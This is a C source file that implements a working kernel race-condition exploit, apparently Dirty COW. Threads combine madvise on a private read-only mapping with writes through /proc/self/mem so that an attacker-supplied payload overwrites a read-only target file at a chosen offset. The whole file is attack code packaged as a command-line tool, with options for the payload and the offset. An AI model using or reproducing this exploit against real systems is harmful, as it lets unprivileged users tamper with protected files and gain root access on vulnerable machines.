#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

#include <getopt.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>

// Instead of getting bogged down in boilerplate return value checks, handle
// them with a macro that does what we want when an error occurs.
#define ERR_IF(cond)            \
	do {                        \
		if (cond) {             \
			perror(__func__);   \
			exit(EXIT_FAILURE); \
		}                       \
	} while (0)

// pthread functions signal errors differently than standard library functions.
// Instead of setting errno, they return the error value, so they need a custom
// error macro.
#define ERR_IF_PTHREAD(status) \
	do {                       \
		int _val = status;     \
		errno = _val;          \
		ERR_IF(_val > 0);      \
	} while (0)

#define VIRTUAL_MEMORY "/proc/self/mem"

char *progname = NULL;
bool stop_thread = false;

typedef struct payload_info {
	char *payload;
	off_t offset;
	void *loc_in_mem;
    char *target_path;
	int target_fd;
} PayloadInfo;

// Write payload to mmap'd memory
static void *writer_thread(void *arg) {
	PayloadInfo *info = arg;
	char *str = info->payload;
	uintptr_t payload_offset = (uintptr_t) info->loc_in_mem + info->offset;

	int mem_fd = open(VIRTUAL_MEMORY, O_RDWR);
	ERR_IF(mem_fd < 0);

	while (!stop_thread) {
		lseek(mem_fd, (off_t) payload_offset, SEEK_SET);
		write(mem_fd, str, strlen(str));
	}

	return NULL;
}

// Advise kernel to drop mapping
static void *madviser_thread(void *arg) {
	PayloadInfo *info = arg;

	while (!stop_thread) {
		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
	}

	return NULL;
}

static void *wait_for_write(void *arg) {
	PayloadInfo *info = arg;
	size_t len = strlen(info->payload);

	while (!stop_thread) {
		sleep(1);

		char buf[len];
		memset(buf, '\0', len);

		int fd = open(info->target_path, O_RDONLY);
		ERR_IF(fd < 0);

		ERR_IF(lseek(fd, info->offset, SEEK_SET) < 0);
		ERR_IF(read(fd, buf, len) < 0);
		
		// close fd before breaking or relooping
		close(fd);
		
		if (memcmp(buf, info->payload, len) == 0) {
			puts("Target file is overwritten. Stopping threads.");
			stop_thread = true;
		}

		// Push this thread to back of run queue allowing "madvisor_thread" and "writer_thread"
		// priority to run, this way after each examination, something new is guaranteed to possibly happen 
		close(fd);
		ERR_IF_PTHREAD(pthread_yield());
	}

	return NULL;
}

static void usage(FILE *stream) {
	fprintf(stream, "Usage:\n");
	fprintf(stream, "\t%s [-h] [-f FILE | -s STRING] [-o OFFSET] TARGET_FILE\n\n", progname);

	fprintf(stream, "Options:\n");
	fprintf(stream, "\t-f, --file  \t name of file containing payload\n"
	                "\t-s, --string\t string to use as payload\n"
	                "\t-o, --offset\t hex offset in file to write payload\n"
	                "\t-h, --help  \t print this help message and exit\n\n");
}

// Print a formatted message (if not null), then exit with a failing status.
static void die(char *fmt, ...) {
	if (fmt != NULL) {
		va_list ap;
		va_start(ap, fmt);
		vfprintf(stderr, fmt, ap);
		va_end(ap);

		printf("\n");
	}

	exit(EXIT_FAILURE);
}

// Parse an offset from the given string, or exit if invalid.
static off_t parse_offset(char *str) {
	char *end;
	unsigned long result = strtoul(str, &end, 0);

	if (*str == '\0' || *end != '\0') {
		die("Invalid offset: \"%s\"", str);
	}

	return (off_t) result;
}

// Load file contents into a heap-allocated string.
static char *read_file(char *path) {
	int fd = open(path, O_RDONLY);
	ERR_IF(fd < 0);

	struct stat file_info;
	ERR_IF(fstat(fd, &file_info) < 0);

	off_t file_size = file_info.st_size;
	char *contents = malloc(file_size + 1);
	ERR_IF(contents == NULL);

	ERR_IF(read(fd, contents, file_size) != file_size);
	contents[file_size] = '\0';
	return contents;
}

// Resize the given buffer, or exit on allocation failure.
static void *resize_buffer(void *buf, size_t size) {
	void *new_buf = realloc(buf, size);
	ERR_IF(new_buf == NULL);
	return new_buf;
}

// Load stdin contents into a heap-allocated string.
static char *read_stdin(void) {
	size_t buf_size = 8;
	char *buf = malloc(buf_size);
	ERR_IF(buf == NULL);

	size_t i = 0;
	int c;

	while ((c = getchar()) != EOF) {
		if (i >= buf_size) {
			// not enough room in buffer; double its size before adding.
			// see: https://en.wikipedia.org/wiki/Dynamic_array#Geometric_expansion_and_amortized_cost
			buf_size *= 2;
			buf = resize_buffer(buf, buf_size);
		}

		buf[i] = c;
		++i;
	}

	if (i >= buf_size) {
		// make sure buffer has enough room for null byte at end
		++buf_size;
		buf = resize_buffer(buf, buf_size);
	}

	buf[i] = '\0';
	return buf;
}

// Parse the command line options to initialize the exploit payload.
static PayloadInfo parse_opts(int argc, char *argv[]) {
	PayloadInfo info = {
		.payload = NULL,
		.offset = 0x0,
		.loc_in_mem = NULL,
		.target_fd = -1,
	};

	struct option longopts[] = {
		{"file",    required_argument, NULL, 'f' },
		{"string",  required_argument, NULL, 's' },
		{"offset",  required_argument, NULL, 'o' },
		{"help",    no_argument,       NULL, 'h' },
		{0}
	};

	int c;

 	while ((c = getopt_long(argc, argv, "f:s:o:h", longopts, NULL)) != -1) {
		switch (c) {
			case 'f':  // file containing payload
				if (info.payload != NULL) {
					usage(stderr);
					die("Only one payload option is allowed.");
				}

				info.payload = read_file(optarg);
				break;
			case 's':
				if (info.payload != NULL) {
					usage(stderr);
					die("Only one payload option is allowed.");
				}

				info.payload = strdup(optarg);
				break;
			case 'o':  // offset position for payload (hex)
				info.offset = parse_offset(optarg);
				break;
			case 'h':
				usage(stdout);
				exit(EXIT_SUCCESS);
			default: // unknown option
				usage(stderr);
				die("Unknown option: %c", c);
		}
	}

	if (optind != argc - 1) {
		// user didn't give exactly one positional argument
		usage(stderr);
		die("Unexpected number of positional arguments.");
	}

	// make sure target path is readable
	char *target_path = argv[optind];
	ERR_IF(access(target_path, R_OK) < 0);

    info.target_path = strdup(target_path);
    ERR_IF(info.target_path == NULL);

	if (info.payload == NULL) {
		// no payload options were given; assume stdin
		info.payload = read_stdin();
	}

	// open target file
	info.target_fd = open(target_path, O_RDONLY);
	ERR_IF(info.target_fd < 0);

	struct stat file_info;
	ERR_IF(fstat(info.target_fd, &file_info) < 0);

	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);
	return info;
}

int main(int argc, char *argv[]) {
	progname = argv[0];
	PayloadInfo info = parse_opts(argc, argv);

	pthread_t thread_1, thread_2, thread_3;

	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, wait_for_write, &info));

	ERR_IF_PTHREAD(pthread_join(thread_1, NULL));
	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));
	ERR_IF_PTHREAD(pthread_join(thread_3, NULL));

	close(info.target_fd);
	free(info.payload);

	return EXIT_SUCCESS;
}
